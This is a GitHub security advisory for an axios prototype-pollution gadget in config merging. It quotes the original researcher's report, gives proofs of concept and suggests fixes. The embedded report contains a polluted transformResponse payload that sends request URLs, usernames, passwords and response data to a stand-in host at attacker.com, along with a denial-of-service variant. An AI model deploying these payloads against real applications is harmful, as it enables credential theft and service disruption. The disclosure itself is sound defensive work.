# [H] axios Vulnerable to Credential Theft and Response Hijacking via Prototype Pollution Gadget in Config Merge

## Summary
Severity: High
Advisory: GHSA-3g43-6gmg-66jw
CVE: CVE-2026-44495
CWE: CWE-1321, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-3g43-6gmg-66jw
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.15.2
- npm: `axios` — affected >=0.19.0 <0.31.1

## Details
## Summary

Axios versions before the fixed releases contain prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted `Object.prototype.transformResponse`, affected Axios versions may treat that inherited value as request configuration or as an option validator.

Axios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over `Object.prototype` before Axios creates a request.

## Impact
For ordinary prototype-pollution primitives that can only assign JSON-like values, this issue primarily results in request failures or denial-of-service attacks.

If the attacker can pollute `Object.prototype.transformResponse` with a function, affected versions of Axios may execute it. In fully affected versions, the function can observe response data and request config, including URL, headers, and `auth`, and can change the response data returned to application code.

This function-valued condition is important. Most query-string or JSON parser prototype-pollution bugs cannot create JavaScript functions on their own, so credential exposure and response tampering are conditional rather than automatic consequences of such bugs.

## Affected Functionality
The affected functionality is Axios request config processing and response transformation.

Affected use requires all of the following:
- An affected Axios version.
- A polluted `Object.prototype` in the same process or browser context.
- Pollution before Axios merges or validates the request config.
- A polluted key relevant to Axios config, especially `transformResponse`.

This is not specific to the Node HTTP adapter. Browser and Node usage can both pass through the shared config/transform pipeline, though real-world exploitability depends on the surrounding application and any helper vulnerabilities.

## Technical Details
In affected versions, `mergeConfig()` reads config values through normal property access. For config keys present in Axios defaults, including `transformResponse`, a missing own property on the request config can fall through to `Object.prototype`.

In the fully affected path, this means `Object.prototype.transformResponse` can replace Axios's default response transform. The selected transform is later executed by `transformData()` with the request config as `this`.

Some later affected v1 releases guarded the merge path but still used inherited properties while looking up validators in `validator.assertOptions()`. In that narrower case, a polluted function can still run during config validation and inspect the config argument, but it does not replace the response transform.

Fixed versions use own-property checks and null-prototype config objects, so inherited `Object.prototype` values are not treated as Axios config or validator schema entries.

## Proof of Concept of Attack
```js
import http from 'http';
import axios from 'axios';

const seen = [];

const server = http.createServer((req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify({ secret: 'response-secret' }));
});

await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));

Object.prototype.transformResponse = function pollutedTransform(data, headers, status) {
  if (headers && typeof status === 'number') {
    seen.push({
      url: this.url,
      username: this.auth && this.auth.username,
      password: this.auth && this.auth.password,
      responseData: data
    });

    return { hijacked: true };
  }

  return true;
};

try {
  const { port } = server.address();

  const response = await axios.get(`http://127.0.0.1:${port}/users`, {
    auth: { username: 'svc-account', password: 'prod-secret-key-123' }
  });

  console.log(response.data); // { hijacked: true }
  console.log(seen[0]);       // request config plus original response body
} finally {
  delete Object.prototype.transformResponse;

  server.close();
}
```

Expected result on fully affected versions: the polluted transform runs, captures request config and response data, and replaces the response returned to the caller.

Expected result on fixed versions: the polluted transform is ignored, and the original response is returned.

<details>
<summary>Original source report</summary>

## Summary

The Axios library is vulnerable to a Prototype Pollution "Gadget" attack that allows any `Object.prototype` pollution in the application's dependency tree to be escalated into **credential theft** and **response hijacking** across all Axios requests.

The `mergeConfig()` function reads config properties via standard property access (`config2[prop]`), which traverses the JavaScript prototype chain. When `Object.prototype.transformResponse` is polluted with a function, it **overrides the default JSON response parser** for every request. The injected function executes with `this = config`, exposing `auth.username`, `auth.password`, request URL, and all headers.

**Severity:** High (CVSS 8.2)
**Affected Versions:** All versions (v0.x - v1.x including v1.15.0)
**Vulnerable Component:** `lib/core/mergeConfig.js` (Config Merge) + `lib/core/transformData.js` (Transform Execution)

## CWE

- **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

## CVSS 3.1

**Score: 9.4 (High)**

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:H`

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network | PP is triggered remotely via any vulnerable dependency |
| Attack Complexity | Low | Once PP exists, a single property assignment exploits axios. Consistent with GHSA-fvcv-3m26-pcqx scoring |
| Privileges Required | None | No authentication needed |
| User Interaction | None | No user interaction required |
| Scope | Unchanged | Credential theft occurs within the same application process |
| Confidentiality | High | `this.auth.password`, `this.url`, original response data all exfiltrated |
| Integrity | Low | Response data is replaced with `true` — attacker **cannot** return arbitrary data due to `assertOptions` constraint (see below) |
| Availability | High | Polluting with an array value causes `TypeError: validator is not a function` crash (DoS) on every request |

### Relationship to GHSA-fvcv-3m26-pcqx

This vulnerability is in the same class as GHSA-fvcv-3m26-pcqx ("Unrestricted Cloud Metadata Exfiltration via Header Injection Chain"), which was also a PP gadget in axios rated Critical. Both require zero direct user input and exploit `mergeConfig`'s prototype chain traversal.

| Factor | GHSA-fvcv-3m26-pcqx | This Vulnerability |
|---|---|---|
| Attack vector | PP → Header injection → Request smuggling | PP → Transform function override → Credential theft |
| Fixed by 1.15.0 header sanitization? | Yes | **No — different code path** |
| Affects | Requests using form-data package | **All requests** (transformResponse is in defaults) |
| Impact | AWS IMDSv2 bypass, cloud compromise | Credential theft (auth, API keys), response hijacking, DoS |

## Usage of "Helper" Vulnerabilities

This vulnerability requires **Zero Direct User Input**.

If an attacker can pollute `Object.prototype` via any other library in the stack (e.g., `qs`, `minimist`, `lodash`, `body-parser`), Axios will automatically pick up the polluted `transformResponse` property during its config merge.

The critical difference from GHSA-fvcv-3m26-pcqx: this vector was **NOT fixed** by the header sanitization patch in v1.15.0, because it does not use headers at all — it injects a function into the response processing pipeline.

## Proof of Concept

### 1. The Setup (Simulated Pollution)

Imagine a scenario where a known vulnerability exists in a query parser. The attacker sends a payload that sets:

```javascript
Object.prototype.transformResponse = function(data, headers, status) {
  // Steal credentials via this context (this = full request config)
  if (this && this.url && typeof data === 'string') {
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify({
        url: this.url,
        username: this.auth?.username,
        password: this.auth?.password,
        responseData: data,
      })
    });
  }
  return true;  // MUST return true to pass assertOptions validator check
};
```

**Important constraint:** The polluted value must be a **function returning `true`**, not an array. If an array is used, `assertOptions()` at `validator.js:89-92` crashes with `TypeError: validator is not a function` (which is still a DoS vector). The function must return `true` because `validator.js:93` checks `result !== true`.

### 2. The Gadget Trigger (Safe Code)

The application makes a completely safe, hardcoded request:

```javascript
// This looks safe to the developer
const response = await axios.get('https://api.internal/users', {
  auth: { username: 'svc-account', password: 'prod-secret-key-123!' }
});
```

### 3. The Execution

Axios's `mergeConfig()` at `mergeConfig.js:99-103` iterates config keys:

```javascript
utils.forEach(Object.keys({...config1, ...config2}), function computeConfigValue(prop) {
  // 'transformResponse' is in config1 (defaults) → included in keys
  const merge = mergeMap[prop];  // → defaultToConfig2
  const configValue = merge(config1[prop], config2[prop], prop);
  // config2['transformResponse'] traverses prototype → finds polluted function!
});
```

The polluted function then executes at `transformData.js:21`:

```javascript
data = fn.call(config, data, headers.normalize(), response ? response.status : undefined);
// fn = attacker's function, this = config (containing auth credentials)
```

### 4. The Impact

```
Attacker receives at https://attacker.com/exfil:

{
  "url": "https://api.internal/users",
  "username": "svc-account",
  "password": "prod-secret-key-123!",
  "responseData": "{\"users\":[{\"id\":1,\"role\":\"admin\"}]}"
}
```

The response data seen by the application is `true` (the required return value), which will likely cause the application to malfunction but will not reveal the theft.

### 5. DoS Variant

```javascript
// Array pollution crashes every request
Object.prototype.transformResponse = [function(d) { return d; }];

await axios.get('https://any-url.com');
// → TypeError: validator is not a function
// Every request in the application crashes
```

## Verified PoC Output

```
Step 1 - Normal behavior (before pollution):  
    Default transformResponse function name: "transformResponse"

Step 2 - Polluting Object.prototype.transformResponse:  
    Function replaced by attacker: true

Step 3 - Simulating dispatchRequest transformResponse:  
    Original server response: {"secret_key":"sk-prod-a1b2c3d4","internal_ip":"10.0.0.5"}  
    After malicious transform: true  
    Response tampered: true

Step 4 - Exfiltrated data:  
    Original response data: {"secret_key":"sk-prod-a1b2c3d4","internal_ip":"10.0.0.5"}  
    Request URL: https://internal-api.corp/secrets  
    Authentication info: {"username":"admin","password":"P@ssw0rd123!"}
```

## Impact Analysis

- **Credential Theft:** `this.auth.username`, `this.auth.password`, `this.headers.Authorization`, and all other config properties are accessible to the injected function. The attacker can exfiltrate them to an external server.
- **Response Data Exfiltration:** The original server response (`data` parameter) is available to the injected function before being replaced.
- **Universal Scope:** Affects **every** axios request in the application, including all third-party libraries that use axios.
- **Denial of Service:** Polluting with a non-function value crashes every request.
- **Bypass of 1.15.0 Fix:** The header sanitization patch in v1.15.0 (GHSA-fvcv-3m26-pcqx fix) does not address this vector.

### Limitations (Honest Assessment)

- Requires a separate prototype pollution vulnerability elsewhere in the dependency tree
- Response data cannot be arbitrarily tampered — the function must return `true` to pass `assertOptions`
- This is in-process JavaScript function execution, not OS-level RCE

## Recommended Fix

Use `hasOwnProperty` checks in `defaultToConfig2` to prevent prototype chain traversal:

```javascript
// In lib/core/mergeConfig.js
function defaultToConfig2(a, b, prop) {
  if (Object.prototype.hasOwnProperty.call(config2, prop) && !utils.isUndefined(b)) {
    return getMergedValue(undefined, b);
  } else if (!utils.isUndefined(a)) {
    return getMergedValue(undefined, a);
  }
}
```

Additionally, validate that `transformResponse` contains only functions before execution:

```javascript
// In lib/core/transformData.js
utils.forEach(fns, function transform(fn) {
  if (typeof fn !== 'function') {
    throw new AxiosError('Transform must be a function', AxiosError.ERR_BAD_OPTION);
  }
  data = fn.call(config, data, headers.normalize(), response ? response.status : undefined);
});
```

## Resources

- [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
- [GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios (Fixed in 1.15.0)](https://github.com/advisories/GHSA-fvcv-3m26-pcqx)
- [Axios GitHub Repository](https://github.com/axios/axios)
- [Snyk: Prototype Pollution](https://learn.snyk.io/lesson/prototype-pollution/)

## Timeline

| Date | Event |
|---|---|
| 2026-04-15 | Vulnerability discovered during source code audit |
| 2026-04-15 | Initial PoC developed (array payload — crashes at validator.js) |
| 2026-04-16 | PoC corrected (function payload returning true — works) |
| 2026-04-16 | Report revised with accurate constraints |
| TBD | Report submitted to vendor via GitHub Security Advisory |
</details>

## References
- https://github.com/axios/axios/security/advisories/GHSA-3g43-6gmg-66jw
- https://nvd.nist.gov/vuln/detail/CVE-2026-44495
- https://github.com/axios/axios
